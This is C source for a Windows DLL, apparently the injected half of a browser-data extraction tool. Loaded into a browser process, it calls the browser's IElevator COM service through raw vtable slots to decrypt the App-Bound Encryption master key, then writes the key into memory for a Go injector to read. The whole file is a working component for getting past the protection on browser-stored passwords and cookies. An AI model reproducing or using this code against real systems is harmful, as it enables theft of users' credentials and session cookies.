#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <objbase.h>
#include <oaidl.h>
#include <wincrypt.h>

#include "bootstrap.h"
#include "com_iid.h"

#define ENV_ENC_B64 "HBD_ABE_ENC_B64"
#define ENV_ENC_MAX 8192

typedef struct {
    HRESULT hr;      // last COM HRESULT (0 on success)
    DWORD   comErr;  // IElevator.DecryptData out DWORD (0 on success / non-COM paths)
    BYTE    errCode; // ABE_ERR_* (ABE_ERR_OK on success)
    BSTR    plain;   // 32-byte BSTR on success; NULL otherwise. Caller owns.
} extract_result;

static void DoExtractKey(BYTE *imageBase);
static extract_result extract_key_inner(const BrowserComIds *ids);
static void publish_key(BYTE *imageBase, const BYTE *plain);
static void publish_error(BYTE *imageBase, BYTE code, HRESULT hr, DWORD comErr);
static BOOL GetOwnExeBasename(char *buf, DWORD bufsize);
static BOOL Base64DecodeStack(const char *b64, BYTE *out_buf, DWORD *out_len);
static HRESULT CallDecryptDataBySlot(IUnknown *pObj, unsigned int vtblIndex,
                                      const BSTR bstrEnc, BSTR *pOut, DWORD *pErr);

BOOL WINAPI DllMain(HINSTANCE hInstance, DWORD dwReason, LPVOID lpReserved)
{
    if (dwReason == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(hInstance);
        if (lpReserved != NULL) {
            DoExtractKey((BYTE *)lpReserved);
        }
    }
    return TRUE;
}

// DoExtractKey is the orchestrator: it handles COM init/uninit, resolves the
// browser identity from the hosting exe, delegates the key-extraction work
// to extract_key_inner, and publishes either the master key or a structured
// error into the scratch region the Go injector reads.
static void DoExtractKey(BYTE *imageBase)
{
    HRESULT initHr = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
    BOOL weInited = SUCCEEDED(initHr);

    char exeBasename[MAX_PATH];
    if (!GetOwnExeBasename(exeBasename, (DWORD)sizeof(exeBasename))) {
        publish_error(imageBase, ABE_ERR_BASENAME, 0, 0);
        goto out;
    }

    const BrowserComIds *ids = LookupBrowserByExe(exeBasename);
    if (!ids) {
        publish_error(imageBase, ABE_ERR_BROWSER_UNKNOWN, 0, 0);
        goto out;
    }

    extract_result r = extract_key_inner(ids);

    if (r.errCode == ABE_ERR_OK && r.plain != NULL &&
        SysStringByteLen(r.plain) == BOOTSTRAP_KEY_LEN) {
        publish_key(imageBase, (const BYTE *)r.plain);
    } else if (r.errCode == ABE_ERR_OK && r.plain != NULL) {
        // COM call succeeded but returned wrong length.
        publish_error(imageBase, ABE_ERR_KEY_LEN, r.hr, 0);
    } else {
        publish_error(imageBase, r.errCode, r.hr, r.comErr);
    }

    if (r.plain) {
        SecureZeroMemory(r.plain, SysStringByteLen(r.plain));
        SysFreeString(r.plain);
    }

out:
    if (weInited) {
        CoUninitialize();
    }
}

// extract_key_inner owns a single resource (bstrEnc) and uses early returns;
// successful exit hands the plaintext BSTR to the caller.
static extract_result extract_key_inner(const BrowserComIds *ids)
{
    extract_result r = {0, 0, ABE_ERR_OK, NULL};

    char envEnc[ENV_ENC_MAX];
    DWORD envEncLen = GetEnvironmentVariableA(ENV_ENC_B64, envEnc, ENV_ENC_MAX);
    if (envEncLen == 0 || envEncLen >= ENV_ENC_MAX) {
        r.errCode = ABE_ERR_ENV_MISSING;
        return r;
    }

    BYTE encKey[ENV_ENC_MAX];
    DWORD encKeyLen = ENV_ENC_MAX;
    if (!Base64DecodeStack(envEnc, encKey, &encKeyLen) || encKeyLen == 0) {
        SecureZeroMemory(encKey, ENV_ENC_MAX);
        SecureZeroMemory(envEnc, ENV_ENC_MAX);
        r.errCode = ABE_ERR_BASE64;
        return r;
    }

    BSTR bstrEnc = SysAllocStringByteLen((LPCSTR)encKey, encKeyLen);
    SecureZeroMemory(encKey, ENV_ENC_MAX);
    SecureZeroMemory(envEnc, ENV_ENC_MAX);
    if (!bstrEnc) {
        r.errCode = ABE_ERR_BSTR_ALLOC;
        return r;
    }

    // IElevator2 is Chrome 144+; older vendors only implement v1. Try v2
    // first (when declared), fall back to v1.
    IUnknown *pObj = NULL;
    HRESULT hr = S_OK;
    if (ids->has_iid_v2) {
        hr = CoCreateInstance(&ids->clsid, NULL, CLSCTX_LOCAL_SERVER,
                              &ids->iid_v2, (void **)&pObj);
        if (FAILED(hr)) pObj = NULL;
    }
    if (!pObj) {
        hr = CoCreateInstance(&ids->clsid, NULL, CLSCTX_LOCAL_SERVER,
                              &ids->iid_v1, (void **)&pObj);
        if (FAILED(hr)) pObj = NULL;
    }
    if (!pObj) {
        SysFreeString(bstrEnc);
        r.hr = hr;
        r.errCode = ABE_ERR_COM_CREATE;
        return r;
    }

    CoSetProxyBlanket(pObj,
                       RPC_C_AUTHN_DEFAULT, RPC_C_AUTHZ_DEFAULT,
                       COLE_DEFAULT_PRINCIPAL,
                       RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
                       RPC_C_IMP_LEVEL_IMPERSONATE,
                       NULL, EOAC_DYNAMIC_CLOAKING);

    BSTR bstrPlain = NULL;
    DWORD comErr = 0;
    hr = CallDecryptDataBySlot(pObj, DecryptDataVtblIndex(ids->kind),
                                bstrEnc, &bstrPlain, &comErr);
    pObj->lpVtbl->Release(pObj);
    SysFreeString(bstrEnc);

    if (FAILED(hr) || bstrPlain == NULL) {
        r.hr = hr;
        r.comErr = comErr;
        r.errCode = ABE_ERR_DECRYPT_DATA;
        return r;
    }

    r.hr = hr;
    r.comErr = comErr;
    r.errCode = ABE_ERR_OK;
    r.plain = bstrPlain;
    return r;
}

static void publish_key(BYTE *imageBase, const BYTE *plain)
{
    // Write key before status; Go reads key only after status == READY.
    for (UINT i = 0; i < BOOTSTRAP_KEY_LEN; ++i) {
        imageBase[BOOTSTRAP_KEY_OFFSET + i] = plain[i];
    }
    MemoryBarrier();
    imageBase[BOOTSTRAP_KEY_STATUS_OFFSET] = BOOTSTRAP_KEY_STATUS_READY;
}

static void publish_error(BYTE *imageBase, BYTE code, HRESULT hr, DWORD comErr)
{
    *(volatile BYTE  *)(imageBase + BOOTSTRAP_EXTRACT_ERR_CODE_OFFSET) = code;
    *(volatile DWORD *)(imageBase + BOOTSTRAP_HRESULT_OFFSET)          = (DWORD)hr;
    *(volatile DWORD *)(imageBase + BOOTSTRAP_COMERR_OFFSET)           = comErr;
}

static BOOL GetOwnExeBasename(char *buf, DWORD bufsize)
{
    char path[MAX_PATH];
    DWORD n = GetModuleFileNameA(NULL, path, MAX_PATH);
    if (n == 0 || n >= MAX_PATH) {
        return FALSE;
    }

    const char *base = path;
    for (DWORD i = 0; i < n; ++i) {
        if (path[i] == '\\' || path[i] == '/') {
            base = path + i + 1;
        }
    }

    DWORD j = 0;
    while (*base && j + 1 < bufsize) {
        char c = *base++;
        if (c >= 'A' && c <= 'Z') {
            c = (char)(c - 'A' + 'a');
        }
        buf[j++] = c;
    }
    buf[j] = '\0';
    return j > 0;
}

static BOOL Base64DecodeStack(const char *b64, BYTE *out_buf, DWORD *out_len)
{
    DWORD flags = 0;
    DWORD skip = 0;
    return CryptStringToBinaryA(b64, 0, CRYPT_STRING_BASE64,
                                 out_buf, out_len, &skip, &flags);
}

// Slot-based vtable dispatch lets us avoid declaring each vendor's full
// C++ interface in C. Slots (5/8/13) are set per-vendor in com_iid.c.
static HRESULT CallDecryptDataBySlot(IUnknown *pObj, unsigned int vtblIndex,
                                      const BSTR bstrEnc, BSTR *pOut, DWORD *pErr)
{
    typedef HRESULT(STDMETHODCALLTYPE *DecryptDataFn)(
        void *This, const BSTR, BSTR *, DWORD *);

    if (!pObj || vtblIndex == 0) {
        return E_INVALIDARG;
    }
    void **vtbl = (void **)pObj->lpVtbl;
    DecryptDataFn fn = (DecryptDataFn)vtbl[vtblIndex];
    if (!fn) {
        return E_POINTER;
    }
    return fn(pObj, bstrEnc, pOut, pErr);
}
